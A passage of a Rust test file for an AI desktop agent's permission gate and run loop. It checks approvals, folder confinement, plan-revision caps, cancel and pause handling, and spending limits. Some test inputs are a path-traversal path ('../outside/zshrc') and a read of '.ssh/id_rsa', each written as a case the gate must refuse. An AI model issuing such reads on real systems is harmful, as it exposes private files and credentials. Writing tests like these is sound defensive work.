        assert_eq!(unattended_refusal(Some(app.handle()), &read_file()), None);
        assert_eq!(
            unattended_refusal(Some(app.handle()), &Action::Screenshot { region: None }),
            None
        );
    }

    #[test]
    fn a_stored_always_allow_lets_the_action_through() {
        let app = managed_app(AgentMode::Build);
        remember(&app, "browser_navigate");

        assert_eq!(unattended_refusal(Some(app.handle()), &navigate()), None);
    }

    #[test]
    fn auto_approve_all_and_session_approvals_do_not_stand_in() {
        let app = managed_app(AgentMode::Autopilot);
        let state = app.handle().state::<ToolConfirmationState>();
        state.set_auto_approve_all(true);
        state.approve_for_session("browser_navigate");
        state.approve_for_session("file_write");

        assert!(unattended_refusal(Some(app.handle()), &navigate()).is_some());
        assert!(unattended_refusal(Some(app.handle()), &write_file()).is_some());
    }

    #[test]
    fn a_shell_command_or_file_write_is_refused_even_after_always_allow() {
        let app = managed_app(AgentMode::Build);
        remember(&app, "terminal_execute");
        remember(&app, "file_write");

        for (action, tool_name) in [
            (run_command(), "'terminal_execute'"),
            (write_file(), "'file_write'"),
        ] {
            let refusal = unattended_refusal(Some(app.handle()), &action)
                .expect("these are only as safe as this run's argument");

            assert!(refusal.contains(tool_name), "{refusal}");
            assert!(!refusal.contains("Always allow"), "{refusal}");
        }
    }

    #[test]
    fn a_run_with_no_approval_service_is_refused_every_judged_action() {
        let refusal = unattended_refusal::<tauri::test::MockRuntime>(None, &read_file())
            .expect("no approval service means no approval");

        assert!(refusal.starts_with(UNATTENDED_DENIAL_PREFIX), "{refusal}");
        assert!(refusal.contains("'file_read'"), "{refusal}");
    }

    #[test]
    fn desktop_input_is_left_to_the_executor_refusal() {
        let app = managed_app(AgentMode::Build);

        assert_eq!(
            unattended_refusal(
                Some(app.handle()),
                &Action::PressKey {
                    keys: vec!["Enter".to_string()]
                }
            ),
            None
        );
    }

    #[test]
    fn a_plan_is_judged_whole_and_names_each_refused_tool_once() {
        let app = managed_app(AgentMode::Build);
        let steps = [
            step(read_file()),
            step(navigate()),
            step(navigate()),
            step(write_file()),
        ];

        let refusals = unattended_plan_refusals(Some(app.handle()), &steps);

        assert_eq!(refusals.len(), 2, "{refusals:?}");
        assert!(refusals[0].contains("'browser_navigate'"), "{refusals:?}");
        assert!(refusals[1].contains("'file_write'"), "{refusals:?}");
    }

    #[test]
    fn a_read_only_revision_is_adopted() {
        let app = managed_app(AgentMode::Build);
        let revised = [
            step(read_file()),
            step(Action::Screenshot { region: None }),
            step(Action::SearchText {
                query: "total".to_string(),
            }),
        ];

        assert_eq!(revision_refusal(Some(app.handle()), 0, &revised), None);
    }

    #[test]
    fn a_revision_that_adds_a_command_a_write_or_a_navigation_is_not_adopted() {
        let app = managed_app(AgentMode::Build);

        for (added, tool_name) in [
            (run_command(), "'terminal_execute'"),
            (write_file(), "'file_write'"),
            (navigate(), "'browser_navigate'"),
        ] {
            let refused =
                revision_refusal(Some(app.handle()), 0, &[step(read_file()), step(added)])
                    .expect("a revision cannot add what the first plan could not hold");

            assert!(refused.starts_with(UNATTENDED_DENIAL_PREFIX), "{refused}");
            assert!(refused.contains(tool_name), "{refused}");
        }
    }

    #[test]
    fn a_revision_gets_no_more_than_the_users_stored_allow() {
        let app = managed_app(AgentMode::Autopilot);
        let state = app.handle().state::<ToolConfirmationState>();
        state.set_auto_approve_all(true);
        state.approve_for_session("file_write");
        remember(&app, "browser_navigate");

        assert_eq!(
            revision_refusal(Some(app.handle()), 0, &[step(navigate())]),
            None
        );
        assert!(revision_refusal(Some(app.handle()), 0, &[step(write_file())]).is_some());
        assert!(revision_refusal(Some(app.handle()), 0, &[step(run_command())]).is_some());
    }

    #[test]
    fn the_plan_is_frozen_once_it_has_been_revised_the_capped_number_of_times() {
        let app = managed_app(AgentMode::Build);
        let revised = [step(read_file())];

        assert_eq!(
            revision_refusal(Some(app.handle()), MAX_PLAN_REVISIONS - 1, &revised),
            None
        );
        let refused = revision_refusal(Some(app.handle()), MAX_PLAN_REVISIONS, &revised)
            .expect("even a read-only revision is refused past the cap");
        assert!(refused.contains("already revised"), "{refused}");
    }

    async fn granted(folder: &Path) -> GrantedFolders {
        granted_folders_for(None, &[folder.to_path_buf()])
            .await
            .expect("a real folder can be granted")
    }

    fn read_of(path: &Path) -> Action {
        Action::ReadFile {
            path: path.to_string_lossy().into_owned(),
        }
    }

    fn write_of(path: &Path) -> Action {
        Action::WriteFile {
            path: path.to_string_lossy().into_owned(),
            content: "done".to_string(),
        }
    }

    #[tokio::test]
    async fn a_file_step_stays_inside_the_folders_the_user_granted() {
        let project = tempfile::TempDir::new().unwrap();
        let elsewhere = tempfile::TempDir::new().unwrap();
        std::fs::write(project.path().join("notes.txt"), "in").unwrap();
        std::fs::write(elsewhere.path().join("zshrc"), "out").unwrap();
        let granted = granted(project.path()).await;

        assert_eq!(
            file_step_refusal_in(&granted, &read_of(&project.path().join("notes.txt"))),
            None
        );
        assert_eq!(
            file_step_refusal_in(&granted, &write_of(&project.path().join("new.txt"))),
            None
        );
        for outside in [
            read_of(&elsewhere.path().join("zshrc")),
            write_of(&elsewhere.path().join("zshrc")),
            write_of(&elsewhere.path().join("new.txt")),
        ] {
            let refusal = file_step_refusal_in(&granted, &outside)
                .expect("the user granted the project folder and nothing else");
            assert!(refusal.contains("outside allowed directories"), "{refusal}");
        }
        assert_eq!(file_step_refusal_in(&granted, &navigate()), None);
    }

    #[tokio::test]
    async fn a_relative_path_is_read_inside_the_project_and_cannot_climb_out_of_it() {
        let root = tempfile::TempDir::new().unwrap();
        let project = root.path().join("project");
        let outside = root.path().join("outside");
        std::fs::create_dir(&project).unwrap();
        std::fs::create_dir(&outside).unwrap();
        std::fs::write(project.join("notes.txt"), "in").unwrap();
        std::fs::write(outside.join("zshrc"), "out").unwrap();
        let granted = granted(&project).await;
        let relative = |path: &str| Action::ReadFile {
            path: path.to_string(),
        };

        let inside = executor::step_in_folder(&relative("notes.txt"), Some(project.as_path()));
        assert!(
            matches!(&inside, Action::ReadFile { path } if Path::new(path).is_absolute()),
            "{inside:?}"
        );
        assert_eq!(relative_path_refusal(&inside), None);
        assert_eq!(file_step_refusal_in(&granted, &inside), None);

        let climbed =
            executor::step_in_folder(&relative("../outside/zshrc"), Some(project.as_path()));
        assert_eq!(relative_path_refusal(&climbed), None);
        let refusal = file_step_refusal_in(&granted, &climbed)
            .expect("a path that leaves the project is outside what was granted");
        assert!(refusal.contains("outside allowed directories"), "{refusal}");

        let new_file = executor::step_in_folder(
            &Action::WriteFile {
                path: "../outside/new.txt".to_string(),
                content: "x".to_string(),
            },
            Some(project.as_path()),
        );
        assert!(file_step_refusal_in(&granted, &new_file).is_some());
    }

    #[test]
    fn a_relative_path_with_no_project_open_is_refused_by_name() {
        let unresolved = executor::step_in_folder(&read_file(), None);

        let refusal = relative_path_refusal(&unresolved).expect("no folder to read it against");

        assert!(refusal.starts_with("Give the full path"), "{refusal}");
        assert!(refusal.contains("'notes.txt'"), "{refusal}");
        assert_eq!(relative_path_refusal(&navigate()), None);
    }

    #[tokio::test]
    async fn a_secrets_path_is_refused_inside_a_granted_folder_too() {
        let project = tempfile::TempDir::new().unwrap();
        std::fs::create_dir(project.path().join(".ssh")).unwrap();
        std::fs::write(project.path().join(".ssh").join("id_rsa"), "key").unwrap();
        let granted = granted(project.path()).await;

        let refusal = file_step_refusal_in(&granted, &read_of(&project.path().join(".ssh/id_rsa")))
            .expect("a key file is never read by an agent step");

        assert!(refusal.contains("protected secrets path"), "{refusal}");
    }

    #[test]
    fn a_dropped_plan_change_is_reported_in_one_line_with_its_reason() {
        let app = managed_app(AgentMode::Build);
        let refused = revision_refusal(
            Some(app.handle()),
            0,
            &[step(navigate()), step(run_command())],
        )
        .expect("two refused steps");

        let note = revision_not_adopted(&refused);

        assert!(note.starts_with("The plan change the model asked for was not adopted: "));
        assert!(!note.contains('\n'), "{note}");
        assert!(note.contains("'browser_navigate'"), "{note}");
        assert!(note.contains("'terminal_execute'"), "{note}");
    }

    #[test]
    fn a_plan_of_reads_has_nothing_to_refuse() {
        let app = managed_app(AgentMode::Build);

        assert!(unattended_plan_refusals(Some(app.handle()), &[step(read_file())]).is_empty());
    }
}

#[cfg(test)]
mod run_loop {
    use super::*;
    use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
    use tokio::sync::Semaphore;

    /// A host with no model and no desktop. Each step waits for a permit, so
    /// a test decides exactly how far the run gets.
    struct FakeHost {
        started: parking_lot::Mutex<Vec<String>>,
        finished: AtomicUsize,
        gate: Semaphore,
        app_total_spend: f64,
        cost_per_step: f64,
    }

    impl FakeHost {
        fn new(permits: usize) -> Arc<Self> {
            Arc::new(Self {
                started: parking_lot::Mutex::new(Vec::new()),
                finished: AtomicUsize::new(0),
                gate: Semaphore::new(permits),
                app_total_spend: 0.0,
                cost_per_step: 0.0,
            })
        }

        fn started(&self) -> Vec<String> {
            self.started.lock().clone()
        }

        fn let_steps_finish(&self, steps: usize) {
            self.gate.add_permits(steps);
        }
    }

    #[async_trait]
    impl RunHost for FakeHost {
        fn emit(&self, _event: &str, _payload: serde_json::Value) {}

        async fn in_project(&self, step: TaskStep) -> TaskStep {
            step
        }

        async fn refusal(&self, _action: &Action) -> Option<String> {
            None
        }

        fn revision_refusal(&self, _revisions: usize, _revised: &[TaskStep]) -> Option<String> {
            None
        }

        async fn run_step(&self, step: &TaskStep) -> Result<StepResult> {
            self.started.lock().push(step.id.clone());
            self.gate.acquire().await.expect("gate").forget();
            self.finished.fetch_add(1, Ordering::SeqCst);
            Ok(StepResult {
                step_id: step.id.clone(),
                success: true,
                result: Some(format!("{} done", step.id)),
                error: None,
                screenshot_path: None,
                duration: Duration::from_millis(1),
            })
        }

        async fn replan(
            &self,
            _failed_step: &str,
            _error: &str,
            _completed: &[String],
            _goal: &str,
        ) -> Result<Vec<TaskStep>> {
            Err(anyhow!("no model in this test"))
        }

        async fn revise(
            &self,
            _goal: &str,
            _outcomes: &[StepOutcome],
            _remaining: &[TaskStep],
        ) -> Result<Option<Vec<TaskStep>>> {
            Ok(None)
        }

        async fn spend(&self) -> f64 {
            self.app_total_spend + self.cost_per_step * self.finished.load(Ordering::SeqCst) as f64
        }
    }

    fn plan(steps: usize) -> Task {
        Task {
            id: "task-1".to_string(),
            description: "Sync the inbox".to_string(),
            status: TaskStatus::Executing,
            created_at: std::time::Instant::now(),
            updated_at: std::time::Instant::now(),
            steps: (1..=steps)
                .map(|number| TaskStep {
                    id: format!("s{number}"),
                    action: Action::Screenshot { region: None },
                    description: format!("step {number}"),
                    expected_result: None,
                    timeout: Duration::from_secs(5),
                    retry_on_failure: false,
                })
                .collect(),
            current_step: 0,
            max_retries: 3,
            retry_count: 0,
            replan_count: 0,
        }
    }

    fn limits() -> RunLimits {
        RunLimits {
            max_step_runs: DEFAULT_MAX_STEP_RUNS,
            spend_cap: 5.0,
            spend_at_start: 0.0,
        }
    }

    fn start(
        host: &Arc<FakeHost>,
        steps: usize,
        control: &RunControl,
        limits: RunLimits,
    ) -> tokio::task::JoinHandle<(Drive, RunState)> {
        let (host, control) = (Arc::clone(host), control.clone());
        tokio::spawn(async move {
            let mut task = plan(steps);
            let mut state = RunState::default();
            let end = drive(&*host, &mut task, &mut state, &control, &limits).await;
            (end, state)
        })
    }

    async fn until(what: &str, mut reached: impl FnMut() -> bool) {
        let deadline = std::time::Instant::now() + Duration::from_secs(5);
        while !reached() {
            assert!(
                std::time::Instant::now() < deadline,
                "never happened: {what}"
            );
            sleep(Duration::from_millis(5)).await;
        }
    }

    #[tokio::test]
    async fn cancel_mid_run_stops_the_step_in_flight_and_every_step_after_it() {
        let host = FakeHost::new(1);
        let control = RunControl::new();
        let run = start(&host, 5, &control, limits());
        until("the second step starts", || host.started().len() == 2).await;

        control.stop(StopReason::Cancelled);
        let (end, state) = run.await.expect("the run ends");

        assert_eq!(end, Drive::Stopped(StopReason::Cancelled));
        assert_eq!(
            state.step_index, 1,
            "the dropped step is not counted as done"
        );
        host.let_steps_finish(10);
        sleep(Duration::from_millis(200)).await;
        assert_eq!(host.started(), vec!["s1", "s2"]);
        assert_eq!(host.finished.load(Ordering::SeqCst), 1);
    }

    #[tokio::test]
    async fn the_time_limit_stops_the_run_itself() {
        let host = FakeHost::new(1);
        let control = RunControl::new();
        let run = start(&host, 5, &control, limits());
        until("the second step starts", || host.started().len() == 2).await;

        control.stop(StopReason::TimeLimit);
        control.stop(StopReason::Cancelled);
        let (end, _) = run.await.expect("the run ends");

        assert_eq!(
            end,
            Drive::Stopped(StopReason::TimeLimit),
            "the first reason is the one the run ends with"
        );
        host.let_steps_finish(10);
        sleep(Duration::from_millis(200)).await;
        assert_eq!(host.started().len(), 2, "a step ran after the limit");
    }

    #[tokio::test]
    async fn pause_holds_at_the_next_step_and_resume_runs_each_step_once() {
        let host = FakeHost::new(1);
        let control = RunControl::new();
        let run = start(&host, 4, &control, limits());
        until("the second step starts", || host.started().len() == 2).await;

        control.pause();
        host.let_steps_finish(10);
        until("the step in flight finishes", || {
            host.finished.load(Ordering::SeqCst) == 2
        })
        .await;
        sleep(Duration::from_millis(300)).await;
        assert_eq!(
            host.started(),
            vec!["s1", "s2"],
            "a step started while the run was paused"
        );
        assert!(control.is_paused());

        control.resume();
        let (end, state) = run.await.expect("the run ends");

        assert_eq!(end, Drive::Done);
        assert_eq!(host.started(), vec!["s1", "s2", "s3", "s4"]);
        assert_eq!(state.step_runs, 4);
        assert_eq!(state.outcomes.len(), 4);
    }

    #[tokio::test]
    async fn a_paused_run_can_still_be_stopped() {
        let host = FakeHost::new(10);
        let control = RunControl::new();
        control.pause();
        let run = start(&host, 3, &control, limits());
        sleep(Duration::from_millis(100)).await;
        assert!(host.started().is_empty());

        control.stop(StopReason::AppClosing);
        let (end, _) = run.await.expect("the run ends");

        assert_eq!(end, Drive::Stopped(StopReason::AppClosing));
        assert!(host.started().is_empty());
    }

    #[tokio::test]
    async fn the_step_limit_counts_steps_that_ran_and_not_time_spent_waiting() {
        let host = FakeHost::new(10);
        let control = RunControl::new();
        control.pause();
        let run = start(
            &host,
            5,
            &control,
            RunLimits {
                max_step_runs: 2,
                ..limits()
            },
        );
        sleep(Duration::from_millis(300)).await;
        control.resume();
        let (end, state) = run.await.expect("the run ends");

        assert_eq!(
            end,
            Drive::Failed("The agent stopped at its step limit (2 step runs).".to_string())
        );
        assert_eq!(state.step_runs, 2);
        assert_eq!(host.started(), vec!["s1", "s2"]);
    }

    #[tokio::test]
    async fn a_run_is_charged_only_for_what_it_spent_itself() {
        let host = Arc::new(FakeHost {
            started: parking_lot::Mutex::new(Vec::new()),
            finished: AtomicUsize::new(0),
            gate: Semaphore::new(10),
            app_total_spend: 400.0,
            cost_per_step: 0.5,
        });
        let control = RunControl::new();
        let run = start(
            &host,
            6,
            &control,
            RunLimits {
                spend_cap: 1.2,
                spend_at_start: 400.0,
                ..limits()
            },
        );
        let (end, _) = run.await.expect("the run ends");

        assert_eq!(
            end,
            Drive::Failed(
                "The agent stopped at its spending limit: it had spent $1.50 of $1.20.".to_string()
            ),
            "spend by the rest of the app before the run began is not the run's"
        );
        assert_eq!(host.started().len(), 3);
    }

    #[tokio::test]
    async fn a_stop_drops_the_work_in_flight() {
        let control = RunControl::new();
        let finished = Arc::new(AtomicBool::new(false));
        let work = {
            let finished = Arc::clone(&finished);
            async move {
                sleep(Duration::from_millis(200)).await;
                finished.store(true, Ordering::SeqCst);
            }
        };
        let stopper = control.clone();
        tokio::spawn(async move {
            sleep(Duration::from_millis(20)).await;
            stopper.stop(StopReason::Cancelled);
        });

        assert_eq!(
            control.unless_stopped(work).await,
            Err(Stopped(StopReason::Cancelled))
        );
        sleep(Duration::from_millis(400)).await;
        assert!(!finished.load(Ordering::SeqCst));
        assert_eq!(
            control.checkpoint().await,
            Err(Stopped(StopReason::Cancelled))
        );
    }

    #[test]
    fn a_run_that_could_not_be_planned_says_what_was_asked_and_what_to_do() {
        let local = planning_failure(TrustMode::Local, "no local model provider is reachable");
        assert!(
            local.starts_with("The run could not be planned."),
            "{local}"
        );
        assert!(local.contains("a model on this computer"), "{local}");
        assert!(
            local.contains("no local model provider is reachable"),
            "{local}"
        );
        assert!(local.contains("Start your local model runtime"), "{local}");
        assert!(local.contains("never sent to a cloud model"), "{local}");

        let cloud = planning_failure(TrustMode::ManagedCloud, "401");
        assert!(cloud.contains("AGI Cloud"), "{cloud}");
        assert!(cloud.contains("signed in"), "{cloud}");
        assert!(!cloud.contains("local model runtime"), "{cloud}");
    }

    #[test]
    fn the_report_carries_each_step_output_bounded() {
        let long = "x".repeat(STEP_OUTPUT_CHARS + 50);
        let bounded = bounded_output(&long);
        assert_eq!(bounded.chars().count(), STEP_OUTPUT_CHARS + 3);
        assert_eq!(bounded_output("3 unread"), "3 unread");

        let outcomes: Vec<StepOutcome> = (1..=REPORTED_STEPS + 5)
            .map(|number| StepOutcome {
                step_id: format!("s{number}"),
                description: format!("step {number}"),
                result: format!("result {number}"),
            })
            .collect();
        let steps = reported_steps(&outcomes);
        assert_eq!(steps.len(), REPORTED_STEPS);
        assert_eq!(steps.last().map(String::as_str), Some("step 55: result 55"));
        assert_eq!(fallback_summary(&outcomes), "step 55: result 55");
        assert_eq!(fallback_summary(&[]), "");
    }
}
